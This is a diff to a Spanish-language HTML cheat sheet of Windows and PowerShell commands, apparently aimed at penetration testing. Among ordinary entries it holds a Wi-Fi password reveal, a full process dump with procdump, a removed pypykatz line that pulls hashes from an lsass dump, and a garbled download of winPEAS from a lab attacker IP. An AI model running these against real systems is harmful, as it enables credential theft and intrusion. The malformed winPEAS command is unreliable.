@@ -64,6 +64,16 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
+                        Este comando se utiliza para cambiar al directorio anterior.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="cd .." oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
                         Muestra una lista de archivos y carpetas en el directorio actual.
                     </div>
                     <div class="comandos">
@@ -244,16 +254,6 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
-                        Este comando muestra una lista de comandos ejecutables en algunas consolas restringidas.
-                    </div>
-                    <div class="comandos">
-                      <input type="text" class="text" value="Get-Command" oninput="ajustarAncho(this)">
-                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
-                    </div>
-                  </div>
-
-                  <div class="contenedor">
-                    <div class="etiqueta">
                         Este comando muestra el nombre de usuario actual del sistema.
                     </div>
                     <div class="comandos">
@@ -377,7 +377,7 @@
                         Usando este comando, puedes mostrar la contraseña guardada de una red Wi-Fi específica.
                     </div>
                     <div class="comandos">
-                      <input type="text" class="text" value="wlan show profile "RedWifiCasa" key=clear" oninput="ajustarAncho(this)">
+                      <input type="text" class="text" value="wlan show profile &quot;RedWifiCasa&quot; key=clear" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -444,16 +444,6 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
-                        Busca si existe algún servicio.
-                    </div>
-                    <div class="comandos">
-                      <input type="text" class="text" value="Get-Service -Name Servicio" oninput="ajustarAncho(this)">
-                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
-                    </div>
-                  </div>
-
-                  <div class="contenedor">
-                    <div class="etiqueta">
                         Una herramienta de línea de comandos para gestionar discos y particiones.
                     </div>
                     <div class="comandos">
@@ -492,15 +482,6 @@
                     </div>
                   </div>
 
-                  <div class="contenedor">
-                    <div class="etiqueta">
-                        Detiene proceso o servicio por su nombre.
-                    </div>
-                    <div class="comandos">
-                      <input type="text" class="text" value="Stop-Process - Name proceso" oninput="ajustarAncho(this)">
-                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
-                    </div>
-                  </div>
 
                   <div class="contenedor">
                     <div class="etiqueta">
@@ -548,6 +529,26 @@
                     </div>
                     <div class="comandos">
                       <input type="text" class="text" value="icacls archivo.txt" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                      Administrar las listas de control de acceso (ACL) de archivos y directorios. Puedes usarlo para ver y modificar los permisos y derechos de acceso de archivos y carpetas en sistemas Windows (archivo_o_directorio es el nombre del archivo o directorio para el cual deseas administrar los permisos, /grant o /deny se utilizan para otorgar o denegar permisos, Usuario es el nombre del usuario o grupo al que deseas asignar permisos y Permiso es el permiso que deseas otorgar o denegar). 
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="icacls archivo_o_directorio /grant:r Usuario:Permiso" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                      Esto otorgará permisos de lectura (Read) y escritura (Write) al usuario "UsuarioEjemplo" en el archivo "archivo.txt".
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="icacls archivo.txt /grant UsuarioEjemplo:(R,W)" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -647,7 +648,7 @@
                         Usando este comando, puedes ver la dirección real detrás de un enlace acortado.
                     </div>
                     <div class="comandos">
-                      <input type="text" class="text" value="curl --head --location "https://ntck.co/itprotv" | findstr Location" oninput="ajustarAncho(this)">
+                      <input type="text" class="text" value="curl --head --location &quot;https://ntck.co/itprotv&quot; | findstr Location" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -752,7 +753,7 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
-                        Muestra el contenido del directorio (dir) en PowerShell.
+                        Muestra el contenido del directorio (dir) en PowerShell, incluyendo archivos ocultos.
                     </div>
                     <div class="comandos">
                       <input type="text" class="text" value="Get-ChildItem -Force" oninput="ajustarAncho(this)">
@@ -872,10 +873,30 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
+                        Se utiliza en PowerShell para obtener información sobre comandos, funciones y cmdlets disponibles en el entorno de PowerShell. Es útil en algunas consolas restringidas.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Command" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
                         Descarga archivos o contenido desde la web.
                     </div>
                     <div class="comandos">
                       <input type="text" class="text" value="Invoke-WebRequest -Uri https://www.ejemplo.com/archivo.zip -OutFile archivo.zip" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Descarga un archivo desde un servidor la web (10.10.14.10).
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.14.27/winPEASx64.exe -OutFile winPeas.exe&quot;"Invoke-WebRequest -UseBasicParsing 10.10.14.10/winPEASx64.exe -OutFile winPeas.exe"" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -972,16 +993,6 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
-                        Descarga un archivo desde un servidor la web (10.10.14.10).
-                    </div>
-                    <div class="comandos">
-                      <input type="text" class="text" value="powershell &quot;Invoke-WebRequest -UseBasicParsing 10.10.14.27/winPEASx64.exe -OutFile winPeas.exe&quot;"Invoke-WebRequest -UseBasicParsing 10.10.14.10/winPEASx64.exe -OutFile winPeas.exe"" oninput="ajustarAncho(this)">
-                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
-                    </div>
-                  </div>
-
-                  <div class="contenedor">
-                    <div class="etiqueta">
                         Muestra las reglas de firewall implementadas.
                     </div>
                     <div class="comandos">
@@ -1050,12 +1061,34 @@
                     </div>
                   </div>
 
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Busca si existe algún servicio.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Get-Service -Name Servicio" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
                   <div class="contenedor">
                     <div class="etiqueta">
                         Muestra información detallada sobre los procesos en ejecución.
                     </div>
                     <div class="comandos">
                       <input type="text" class="text" value="Get-Process | Where-Object { $_.WorkingSet -gt 100MB }" oninput="ajustarAncho(this)">
+                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
+                    </div>
+                  </div>
+
+
+                  <div class="contenedor">
+                    <div class="etiqueta">
+                        Detiene proceso o servicio por su nombre.
+                    </div>
+                    <div class="comandos">
+                      <input type="text" class="text" value="Stop-Process - Name proceso" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -1072,20 +1105,10 @@
 
                   <div class="contenedor">
                     <div class="etiqueta">
-                        Realiza un volcado de información de un proceso (requiere un ID de proceso).
+                        Realiza un volcado de información de un proceso (requiere un ID de proceso). Se necesita descargar la herramienta Procdump. El "./" al principio se usa para indicar que el archivo está en el directorio actual.
                     </div>
                     <div class="comandos">
                       <input type="text" class="text" value="./procdump64.exe -accepteula -ma 56809" oninput="ajustarAncho(this)">
-                      <button><i class="fa fa-clone"></i><span> Copy</span></button>
-                    </div>
-                  </div>
-
-                  <div class="contenedor">
-                    <div class="etiqueta">
-                        Muestra hashes contenidos en un archivo (requiere un archivo de minidump).
-                    </div>
-                    <div class="comandos">
-                      <input type="text" class="text" value="pypykatz lsa minidump lsass.DMP" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
@@ -1165,7 +1188,7 @@
                         Crea una tarea programada.
                     </div>
                     <div class="comandos">
-                      <input type="text" class="text" value="Register-ScheduledTask -TaskName "MiTarea" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute &quot;C:\mi_script.ps1&quot;)" oninput="ajustarAncho(this)">
+                      <input type="text" class="text" value="Register-ScheduledTask -TaskName &quot;MiTarea&quot; -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute &quot;C:\mi_script.ps1&quot;)" oninput="ajustarAncho(this)">
                       <button><i class="fa fa-clone"></i><span> Copy</span></button>
                     </div>
                   </div>
